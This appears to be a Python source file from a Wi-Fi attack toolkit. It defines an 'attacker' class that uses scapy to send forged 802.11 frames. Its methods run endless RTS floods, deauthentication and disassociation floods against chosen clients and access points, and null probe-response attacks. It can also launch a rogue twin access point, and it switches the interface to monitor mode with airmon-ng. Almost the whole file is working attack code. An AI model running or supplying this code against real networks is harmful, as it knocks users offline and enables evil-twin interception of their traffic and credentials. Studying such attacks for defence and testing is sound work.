import multiprocessing
import threading
import time
import keyboard

import Drawer
from Sniffer_dir.common import bash
from Sniffer_dir.common import *
from Sniffer_dir.constants import *
from pathlib import Path


import struct
import sys

import scapy
from scapy import *
from scapy.layers.dot11 import RadioTap, Dot11, conf, Dot11Deauth, Dot11Elt, Dot11ProbeResp, Dot11Disas
from scapy.sendrecv import sendp

from Sniffer_dir import FakeAP

class attacker:
    def __init__(self, attack_int):
        self.attack_int = attack_int

    def __del__(self): # Destroy here all complex fields!!!
        self.screen = ""

    def rts_flood(self, args: dict):
        if "attacking_addr" in args.keys():
            attacking_addr = args["attacking_addr"]
        else:
            attacking_addr = '05:12:54:15:54:11'

        self.attack_int = self.__start_monitor_mode(self.attack_int)
        if args["Freq"] == '2.4':  # 2.4 GHz
            self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот

        # conf = scapy.config.Conf()
        # conf.use_pcap = True

        bytes = struct.pack("<H", 32768)  # 32767 microseconds
        timeval = struct.unpack(">H", bytes)[0]
        # print(timeval)
        frame = RadioTap() / Dot11(type=1, subtype=11, addr1=args["BSSID"], addr2=attacking_addr, ID=timeval)
        # RadioTap() / Dot11(type=1, subtype=11, addr1 = target_addr, addr2 = my_addr, ID=timeval) #RTS
        # RadioTap() / Dot11(type=1, subtype=12, addr1 = target_addr, ID=timeval) #CTS
        quantity = 1000

        # frame.show()

        while True:
            sendp(frame, iface=self.attack_int, count=quantity, verbose=0)  # verbose=0, monitor=True

    def deauth(self, args: list[dict], frames_quantity=-1):
        if frames_quantity == -1:
            print("Deauth forever")

            self.attack_int = self.__start_monitor_mode(self.attack_int)
            while True:
                for i in range(len(args)):
                    # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                    #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                    self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                    deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
                                                      addr3=args[i]["BSSID"]) / Dot11Deauth(reason=7)
                    quantity = 10
                    sendp(deauth_frame, iface=self.attack_int, count=quantity, verbose=0)
        else:
            for i in range(len(args)):
                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
                                                  addr3=args[i]["BSSID"]) / Dot11Deauth(reason=7)
                sendp(deauth_frame, iface=self.attack_int, count=frames_quantity, verbose=0)

    def __deauth(self, args: dict, frames_quantity=1):
        deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args["MAC"], addr2=args["BSSID"],
                                          addr3=args["BSSID"]) / Dot11Deauth(reason=7)
        sendp(deauth_frame, iface=self.attack_int, count=frames_quantity, verbose=0)

    def null_probe_response(self, args: list[dict]):
        self.attack_int = self.__start_monitor_mode(self.attack_int)
        while True:
            for i in range(len(args)):
                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                self.__deauth(args[i], 5)

                null_probe_resp_frame = RadioTap() / Dot11(addr1=args[i]["MAC"], addr2=args[i]["BSSID"], addr3=args[i]["BSSID"]) \
                                         / Dot11ProbeResp(cap="ESS") \
                                         / Dot11Elt(ID="SSID",  len=0, info="") \
                                         / Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16') \
                                         / Dot11Elt(ID="DSset", info="\x06") \
                                         / Dot11Elt(ID="TIM",   info="\xFF\xFF\xFF\xFF")
                sendp(null_probe_resp_frame, iface=self.attack_int, count=10, verbose=0)

    def dissasoc(self, args: list[dict], frames_quantity=-1, reason=7):
        if frames_quantity == -1:
            self.attack_int = self.__start_monitor_mode(self.attack_int)
            while True:
                for i in range(len(args)):
                    # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                    #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                    self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                    dissasoc_frame = RadioTap() / Dot11(type=0, subtype=0xa, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
                                                      addr3=args[i]["BSSID"]) / Dot11Disas(reason=reason)
                    quantity = 10
                    sendp(dissasoc_frame, iface=self.attack_int, count=quantity, verbose=0)
        else:
            for i in range(len(args)):
                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                dissasoc_frame = RadioTap() / Dot11(type=0, subtype=0xa, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
                                                  addr3=args[i]["BSSID"]) / Dot11Deauth(reason=reason)
                sendp(dissasoc_frame, iface=self.attack_int, count=frames_quantity, verbose=0)

    def omerta_attack(self, args: list[dict]):
        self.dissasoc(args, reason=0x01)


    def rogue_twin(self, args: dict):
        if args["Freq"] == '2.4':  # 2.4 GHz
            self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот

        ap = FakeAP.AP(wirelessiface=self.attack_int, channel=int(args["Channel"]), ssid=args["SSID"])
        ap.launch()

    def __GetInterfaces(self):
        retval = []
        p = Path(INTERFACESPATH)
        for i in os.listdir(INTERFACESPATH):
            for iface in os.listdir(p / i / INTERFACESPATHAPPENDIX):
                retval.append(iface)
        return retval

    def __start_monitor_mode(self, interface):  # возвращает имя интерфейса после его перевода в режим монитора
        bash(f"airmon-ng check kill > /dev/null")
        bash(f"airmon-ng start {interface} > /dev/null")
        for i in self.__GetInterfaces():
            if interface in i:
                self.interface = i
                return i

        return None

    def __change_channel(self, interface, channel: int = 1):
        bash(f"iwconfig {interface} channel {channel}")
